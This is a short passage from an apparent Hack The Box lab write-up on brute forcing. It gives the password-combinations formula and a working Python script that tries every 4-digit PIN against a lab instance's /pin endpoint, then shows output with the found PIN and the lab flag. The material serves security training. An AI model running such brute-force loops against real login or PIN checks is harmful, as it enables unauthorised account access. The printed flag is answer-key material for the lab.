To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password:
```mathml
Possible Combinations = Character Set Size^Password Length
```

## Cracking the PIN
The instance application generates a random 4-digit PIN and exposes an endpoint (`/pin`) that accepts a PIN as a query parameter. If the provided PIN matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.

Python code:

```python
import requests

ip = "83.136.253.5"
port = 31389

for pin in range(10000):
	formatted_pin = f"{pin:04d}"
	print(f"Attempted PIN: {formatted_pin}")
	
	response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
	
	if response.ok and 'flag' in response.json():
		print(f"Correct PIN found: {formatted_pin}")
		print(f"Flag: {response.json()['flag']}")
		break
```

```bash
> python3 brute.py
...
...
Attempted PIN: 1085
Attempted PIN: 1086
Attempted PIN: 1087
Attempted PIN: 1088
Correct PIN found: 1088
Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
```